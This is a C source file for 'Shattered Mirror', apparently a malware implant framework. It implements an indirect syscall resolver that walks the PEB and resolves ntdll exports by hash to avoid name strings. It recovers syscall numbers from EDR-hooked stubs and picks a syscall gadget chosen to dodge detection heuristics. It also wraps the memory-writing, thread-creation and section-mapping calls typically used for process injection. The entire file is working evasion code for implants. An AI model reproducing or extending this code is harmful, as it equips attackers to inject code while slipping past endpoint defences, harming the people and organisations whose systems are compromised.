/*=============================================================================
 * Shattered Mirror v1 — Indirect Syscall Resolver
 * 
 * Resolves NT function SSNs from ntdll.dll at runtime via PEB walking.
 * Locates syscall;ret gadgets inside ntdll's .text section.
 * All resolution is hash-based — zero static function name strings.
 *
 * Compatibility: Windows 10 1809+ through Windows 11 25H2+
 * Handles both clean and EDR-hooked ntdll stubs.
 *
 * Build: MSVC x64 (/GS- /O2)
 *===========================================================================*/

#include "../include/indirect_syscall.h"
#include <intrin.h>   /* for __readgsqword */

/*---------------------------------------------------------------------------
 *  PEB Walk — Locate a loaded module by DJB2 hash of its name.
 *  Reads the PEB directly from the GS segment (x64 TEB→PEB).
 *  No API calls, completely invisible to any hooks.
 *-------------------------------------------------------------------------*/
PVOID GetModuleBaseByHash(DWORD dwModuleHash) {
    /* TEB is at gs:[0x30], PEB is at TEB+0x60 */
    /* Use local pointer to avoid PPEB type redefinition conflicts */
    PVOID pPebPtr = (PVOID)__readgsqword(0x60);
    if (!pPebPtr) return NULL;

    /* Cast to our own local structure to avoid winternl.h conflicts */
    typedef struct _PEB_T {
        UCHAR Reserved1[2];
        UCHAR BeingDebugged;
        UCHAR Reserved2[1];
        PVOID Reserved3[2];
        PPEB_LDR_DATA_FULL Ldr;
    } PEB_T;

    PEB_T* pPeb = (PEB_T*)pPebPtr;
    if (!pPeb->Ldr) return NULL;

    PPEB_LDR_DATA_FULL pLdr = (PPEB_LDR_DATA_FULL)pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pCurrent = pHead->Flink;

    while (pCurrent != pHead) {
        PLDR_DATA_TABLE_ENTRY_FULL pEntry =
            CONTAINING_RECORD(pCurrent, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);

        if (pEntry->BaseDllName.Buffer && pEntry->BaseDllName.Length > 0) {
            /* Convert wide name to lowercase ASCII for hashing */
            char szName[256] = { 0 };
            int len = pEntry->BaseDllName.Length / sizeof(WCHAR);
            if (len > 255) len = 255;

            for (int i = 0; i < len; i++) {
                WCHAR wc = pEntry->BaseDllName.Buffer[i];
                /* Lowercase ASCII conversion */
                if (wc >= L'A' && wc <= L'Z')
                    szName[i] = (char)(wc + 32);
                else
                    szName[i] = (char)wc;
            }
            szName[len] = '\0';

            if (djb2_hash_rt(szName) == dwModuleHash) {
                return pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

/*---------------------------------------------------------------------------
 *  Export Resolution — Walk a module's export table, match by hash.
 *  Completely replaces GetProcAddress (which EDRs hook).
 *-------------------------------------------------------------------------*/
PVOID GetExportByHash(PVOID pModuleBase, DWORD dwFuncHash) {
    if (!pModuleBase) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD dwExportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD dwExportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!dwExportRVA) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + dwExportRVA);

    PDWORD pdwNames     = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfFunctions);
    PWORD  pwOrdinals   = (PWORD)((BYTE*)pModuleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szFuncName = (const char*)((BYTE*)pModuleBase + pdwNames[i]);

        if (djb2_hash_rt(szFuncName) == dwFuncHash) {
            DWORD dwFuncRVA = pdwFunctions[pwOrdinals[i]];

            /* Check for forwarded export (RVA inside export directory) */
            if (dwFuncRVA >= dwExportRVA && dwFuncRVA < (dwExportRVA + dwExportSize)) {
                /* Forwarded — we skip these, shouldn't happen for Nt* funcs */
                return NULL;
            }

            return (PVOID)((BYTE*)pModuleBase + dwFuncRVA);
        }
    }
    return NULL;
}

/*---------------------------------------------------------------------------
 *  SSN Extraction — Read the System Service Number from an NT stub.
 *
 *  Clean stub layout (Win10/11):
 *    4C 8B D1          mov r10, rcx
 *    B8 XX XX 00 00    mov eax, <SSN>
 *    ...
 *
 *  Hooked stub (EDR detoured):
 *    E9 XX XX XX XX    jmp <hook_trampoline>
 *    ...
 *    (SSN still present a few bytes in, or we use neighbor technique)
 *
 *  Neighbor technique: If a stub is hooked, look at adjacent Nt functions
 *  (which are sorted by SSN) and interpolate. If NtFoo at index N has
 *  SSN = X, and NtBar at index N+1 has SSN = X+1, we can recover.
 *-------------------------------------------------------------------------*/
BOOL ExtractSSN(PVOID pFunctionAddr, PDWORD pdwSSN) {
    if (!pFunctionAddr || !pdwSSN) return FALSE;

    BYTE* pBytes = (BYTE*)pFunctionAddr;

    /*--- Pattern A: Clean stub ---*/
    /* 4C 8B D1 B8 XX XX 00 00 */
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 &&
        pBytes[3] == 0xB8) {
        *pdwSSN = *(DWORD*)(pBytes + 4);
        return TRUE;
    }

    /*--- Pattern B: Stub starts with mov r10, rcx but eax load is offset ---*/
    /* Some Win11 builds: 4C 8B D1 ... B8 at offset 8 */
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1) {
        /* Search within first 32 bytes for mov eax, imm32 (B8) */
        for (int j = 3; j < 32; j++) {
            if (pBytes[j] == 0xB8) {
                *pdwSSN = *(DWORD*)(pBytes + j + 1);
                return TRUE;
            }
        }
    }

    /*--- Pattern C: Hooked (JMP at start) — use neighbor resolution ---*/
    if (pBytes[0] == 0xE9) {
        /* Look DOWN (next function, +32 bytes per stub typically) */
        for (int offset = 1; offset <= 3; offset++) {
            BYTE* pNeighbor = pBytes + (offset * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B &&
                pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                DWORD neighborSSN = *(DWORD*)(pNeighbor + 4);
                *pdwSSN = neighborSSN - offset;
                return TRUE;
            }
        }

        /* Look UP (previous function, -32 bytes) */
        for (int offset = 1; offset <= 3; offset++) {
            BYTE* pNeighbor = pBytes - (offset * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B &&
                pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                DWORD neighborSSN = *(DWORD*)(pNeighbor + 4);
                *pdwSSN = neighborSSN + offset;
                return TRUE;
            }
        }
    }

    return FALSE;
}

/*---------------------------------------------------------------------------
 *  Gadget Scanner — Scan ntdll's .text section for 0F 05 C3
 *  (syscall; ret). We need a clean gadget address to JMP to.
 *
 *  We pick a gadget that's NOT at the start of any known Nt function
 *  (to avoid triggering "unexpected syscall origin" heuristics).
 *  Specifically, we look for gadgets in the middle of stub regions.
 *-------------------------------------------------------------------------*/
PVOID FindSyscallGadget(PVOID pNtdllBase, DWORD dwNtdllSize) {
    if (!pNtdllBase) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)pNtdllBase + pDos->e_lfanew);

    /* Walk section headers to find .text */
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID  pTextBase = NULL;
    DWORD  dwTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        /* .text section — executable code region */
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (BYTE*)pNtdllBase + pSection[i].VirtualAddress;
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextBase || dwTextSize < 3) return NULL;

    BYTE* pScan = (BYTE*)pTextBase;
    PVOID pBestGadget = NULL;
    int   nFound = 0;

    for (DWORD i = 0; i < dwTextSize - 2; i++) {
        /* syscall (0F 05) followed by ret (C3) */
        if (pScan[i] == 0x0F && pScan[i + 1] == 0x05 && pScan[i + 2] == 0xC3) {
            nFound++;
            /*
             * Pick the 3rd gadget we find — not the first (too obvious),
             * not a random one (reproducibility). The 3rd is deep enough
             * into the stub region to look natural.
             */
            if (nFound == 3) {
                pBestGadget = &pScan[i];
                break;
            }
        }
    }

    /* Fallback: if we didn't find 3, use whatever we got */
    if (!pBestGadget && nFound > 0) {
        for (DWORD i = 0; i < dwTextSize - 2; i++) {
            if (pScan[i] == 0x0F && pScan[i + 1] == 0x05 && pScan[i + 2] == 0xC3) {
                pBestGadget = &pScan[i];
                break;
            }
        }
    }

    return pBestGadget;
}

/*---------------------------------------------------------------------------
 *  Initialize the syscall table — master init function.
 *  Call this once during implant startup.
 *
 *  Steps:
 *    1. PEB walk to find ntdll base
 *    2. Get ntdll image size from PE headers
 *    3. Find a syscall;ret gadget
 *    4. For each target function hash → resolve address → extract SSN
 *    5. Populate the table
 *-------------------------------------------------------------------------*/
BOOL InitSyscallTable(PSYSCALL_TABLE pTable) {
    if (!pTable) return FALSE;

    /* Zero out the table */
    for (int i = 0; i < MAX_SYSCALL_ENTRIES; i++) {
        pTable->Entries[i].dwHash = 0;
        pTable->Entries[i].dwSSN = 0;
        pTable->Entries[i].pSyscallGadget = NULL;
        pTable->Entries[i].pFunctionAddr = NULL;
        pTable->Entries[i].bResolved = FALSE;
    }
    pTable->dwCount = 0;

    /* Step 1: Find ntdll via PEB walk */
    pTable->pNtdllBase = GetModuleBaseByHash(HASH_NTDLL);
    if (!pTable->pNtdllBase) return FALSE;

    /* Step 2: Get image size */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pTable->pNtdllBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pTable->pNtdllBase + pDos->e_lfanew);
    pTable->dwNtdllSize = pNtHdr->OptionalHeader.SizeOfImage;

    /* Step 3: Find syscall;ret gadget */
    PVOID pGadget = FindSyscallGadget(pTable->pNtdllBase, pTable->dwNtdllSize);
    if (!pGadget) return FALSE;
    pTable->SyscallAddress = pGadget;

    /* Step 4: Define which functions we need */
    DWORD targetHashes[] = {
        HASH_NtAllocateVirtualMemory,
        HASH_NtWriteVirtualMemory,
        HASH_NtProtectVirtualMemory,
        HASH_NtCreateThreadEx,
        HASH_NtSetContextThread,
        HASH_NtGetContextThread,
        HASH_NtClose,
        HASH_NtOpenProcess,
        HASH_NtCreateSection,
        HASH_NtMapViewOfSection,
        HASH_NtUnmapViewOfSection,
        HASH_NtQueueApcThread,
        HASH_NtWaitForSingleObject,
        HASH_NtDelayExecution,
        HASH_NtSetInformationThread,
        HASH_NtResumeThread,
        HASH_NtSuspendThread,
        HASH_NtQueryInformationProcess,
    };

    DWORD nTargets = sizeof(targetHashes) / sizeof(targetHashes[0]);
    if (nTargets > MAX_SYSCALL_ENTRIES) nTargets = MAX_SYSCALL_ENTRIES;

    /* Step 5: Walk ntdll exports, match hashes, extract SSNs */
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pTable->pNtdllBase +
        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD pdwNames     = (PDWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfFunctions);
    PWORD  pwOrdinals   = (PWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((BYTE*)pTable->pNtdllBase + pdwNames[i]);
        DWORD dwHash = djb2_hash_rt(szName);

        for (DWORD t = 0; t < nTargets; t++) {
            if (dwHash == targetHashes[t]) {
                PVOID pFunc = (PVOID)((BYTE*)pTable->pNtdllBase + pdwFunctions[pwOrdinals[i]]);
                DWORD dwSSN = 0;

                if (ExtractSSN(pFunc, &dwSSN)) {
                    pTable->Entries[pTable->dwCount].dwHash         = dwHash;
                    pTable->Entries[pTable->dwCount].dwSSN           = dwSSN;
                    pTable->Entries[pTable->dwCount].pSyscallGadget  = pGadget;
                    pTable->Entries[pTable->dwCount].pFunctionAddr   = pFunc;
                    pTable->Entries[pTable->dwCount].bResolved       = TRUE;
                    pTable->dwCount++;
                }
                break;
            }
        }
    }

    if (pTable->SyscallAddress == NULL) {
        return FALSE;
    }

    return (pTable->dwCount == nTargets);
}

/*---------------------------------------------------------------------------
 *  Lookup a resolved entry by function hash.
 *  O(n) scan — n is small (< 20), no perf concern.
 *-------------------------------------------------------------------------*/
PSYSCALL_ENTRY GetSyscallEntry(PSYSCALL_TABLE pTable, DWORD dwHash) {
    if (!pTable) return NULL;

    for (DWORD i = 0; i < pTable->dwCount; i++) {
        if (pTable->Entries[i].dwHash == dwHash && pTable->Entries[i].bResolved) {
            return &pTable->Entries[i];
        }
    }
    return NULL;
}

/*==========================================================================
 * Global syscall table instance
 * Atoms and Orchestrator reference this directly after InitSyscallTable().
 *========================================================================*/
SYSCALL_TABLE g_SyscallTable = { 0 };

/*==========================================================================
 * Convenience Wrappers
 * Each wrapper looks up the entry, then calls the ASM SyscallDispatch.
 * Type-safe interfaces — callers don't touch the raw dispatch.
 *========================================================================*/

NTSTATUS IndirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtAllocateVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001; /* STATUS_UNSUCCESSFUL */
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, ZeroBits,
                           RegionSize, AllocationType, Protect);
}

NTSTATUS IndirectNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtWriteVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, Buffer,
                           NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS IndirectNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtProtectVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, RegionSize,
                           NewProtect, OldProtect);
}

NTSTATUS IndirectNtCreateThreadEx(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaximumStackSize,
    PSM_PS_ATTRIBUTE_LIST AttributeList)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtCreateThreadEx);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, DesiredAccess, ObjectAttributes,
                           ProcessHandle, StartRoutine, Argument, CreateFlags,
                           ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS IndirectNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtSetContextThread);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, ThreadContext);
}

NTSTATUS IndirectNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtGetContextThread);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, ThreadContext);
}

NTSTATUS IndirectNtClose(HANDLE Handle)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtClose);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, Handle);
}

NTSTATUS IndirectNtOpenProcess(
    PHANDLE               ProcessHandle,
    ACCESS_MASK           DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    PSM_CLIENT_ID         ClientId)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtOpenProcess);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS IndirectNtQueryInformationProcess(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtQueryInformationProcess);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, ProcessInformationClass,
                           ProcessInformation, ProcessInformationLength, ReturnLength);
}

NTSTATUS IndirectNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtDelayExecution);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, (HANDLE)(ULONG_PTR)Alertable, DelayInterval);
}

NTSTATUS IndirectNtCreateSection(
    PHANDLE               SectionHandle,
    ACCESS_MASK           DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER        MaximumSize,
    ULONG                 SectionPageProtection,
    ULONG                 AllocationAttributes,
    HANDLE                FileHandle)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtCreateSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, SectionHandle, DesiredAccess, ObjectAttributes,
                           MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
}

NTSTATUS IndirectNtMapViewOfSection(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtMapViewOfSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, SectionHandle, ProcessHandle, BaseAddress,
                           ZeroBits, CommitSize, SectionOffset, ViewSize,
                           InheritDisposition, AllocationType, Win32Protect);
}

NTSTATUS IndirectNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress)
{
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtUnmapViewOfSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress);
}
